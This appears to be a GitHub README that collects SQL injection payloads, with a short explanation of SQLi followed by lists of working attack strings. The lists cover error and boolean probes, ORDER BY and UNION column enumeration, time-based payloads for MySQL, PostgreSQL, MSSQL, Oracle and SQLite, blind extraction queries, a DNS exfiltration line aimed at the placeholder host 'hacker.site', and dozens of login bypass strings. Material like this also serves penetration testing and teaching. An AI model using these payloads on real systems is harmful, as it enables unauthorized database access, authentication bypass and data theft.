# SQL-Injection-Payloads
A small payload for sql injection. 
# What is SQL Injection ?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.

![sql-injection](https://user-images.githubusercontent.com/115652296/195398529-be72a6b3-d6d9-405e-a8be-25168cc5290e.svg)

# Identifying SQLi | Error based payloads :
You can use these usefull examples :
```
'
"
`
')
")
`)
'))
"))
`))
/
//
\
\\
```
You can also confirm that there is an sqli vulnerability by using logical operations :

Using `OR`:
```
OR 1=1
OR 1=0
OR x=x
OR x=y
OR 1=1#
OR 1=0#
OR x=x#
OR x=y#
OR 1=1-- 
OR 1=0-- 
OR x=x-- 
OR x=y--
```
Using `AND` :
```
AND 1=1
AND 1=0
AND 1=1-- 
AND 1=0-- 
AND 1=1#
AND 1=0#
```
Using `WHERE` :
```
WHERE 1=1 AND 1=1
WHERE 1=1 AND 1=0
WHERE 1=1 AND 1=1#
WHERE 1=1 AND 1=0#
WHERE 1=1 AND 1=1--
WHERE 1=1 AND 1=0--
```
Using `ORDER` :
```
ORDER BY 1-- 
ORDER BY 2-- 
ORDER BY 3-- 
ORDER BY 4-- 
ORDER BY 5-- 
ORDER BY 6-- 
ORDER BY 7-- 
ORDER BY 8-- 
ORDER BY 9-- 
ORDER BY 10--
ORDER BY 1# 
ORDER BY 2# 
ORDER BY 3# 
ORDER BY 4# 
ORDER BY 5# 
ORDER BY 6# 
ORDER BY 7# 
ORDER BY 8# 
ORDER BY 9# 
ORDER BY 10# 
ORDER BY 1 
ORDER BY 2 
ORDER BY 3 
ORDER BY 4 
ORDER BY 5 
ORDER BY 6 
ORDER BY 7 
ORDER BY 8 
ORDER BY 9 
ORDER BY 10
```
```
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
```

# Time Based SQL Injection Payloads

MySql :
```
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
```

PostgreSQL :
```
1' or pg_sleep(10)
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)-
```

MSQL :
```
1' waitfor delay '0:0:10'
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
```

Oracle :
```
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
```

SQLite
```
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

# Union Select Payloads

```
UNION ALL SELECT 1
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2,3
UNION ALL SELECT 1,2,3,4
UNION ALL SELECT 1,2,3,4,5
UNION ALL SELECT 1,2,3,4,5,6
UNION ALL SELECT 1,2,3,4,5,6,7
UNION ALL SELECT 1,2,3,4,5,6,7,8
UNION ALL SELECT 1,2,3,4,5,6,7,8,9
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
UNION ALL SELECT 1#
UNION ALL SELECT 1,2#
UNION ALL SELECT 1,2,3#
UNION ALL SELECT 1,2,3,4#
UNION ALL SELECT 1,2,3,4,5#
UNION ALL SELECT 1,2,3,4,5,6#
UNION ALL SELECT 1,2,3,4,5,6,7#
UNION ALL SELECT 1,2,3,4,5,6,7,8#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
UNION ALL SELECT 1-- 
UNION ALL SELECT 1,2-- 
UNION ALL SELECT 1,2,3-- 
UNION ALL SELECT 1,2,3,4-- 
UNION ALL SELECT 1,2,3,4,5-- 
UNION ALL SELECT 1,2,3,4,5,6-- 
UNION ALL SELECT 1,2,3,4,5,6,7-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
UNION ALL SELECT 1,2,3,4,5,6,7,8,9--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--
UNION ALL SELECT 'INJ'||'ECT'||'XXX'
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--
```
#Blind SQL Injections Payloads :

In the case of Blind SQL injection, you can’t see the results of the query nor the errors, but you can distinguish when the query returned a true or a false response based on the different content on the page.

You can abuse that behaviour to dump the database char by char :

```?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'```

#Error Blind SQL Injection Payloads :

As the name implies, this is very similar to Blind SQL injection, but this time you don’t have to distinguish between a true or false response. You check if there is an error in the SQL query or not, by forcing an SQL error each time you correctly guess the char :

```AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- - ```

#Out of band SQLi Payloads :

If none of the exploitation methods mentioned above worked for you, you can try to make the database exfiltrate the data to an external host controlled by you. For example, you can use DNS queries :

```select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));```

# Auth Bypass Payloads :
```
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
````


# References :

https://portswigger.net/web-security/sql-injection

https://brightsec.com/blog/sql-injection-payloads/#entry-point-detection

https://owasp.org/www-community/attacks/SQL_Injection
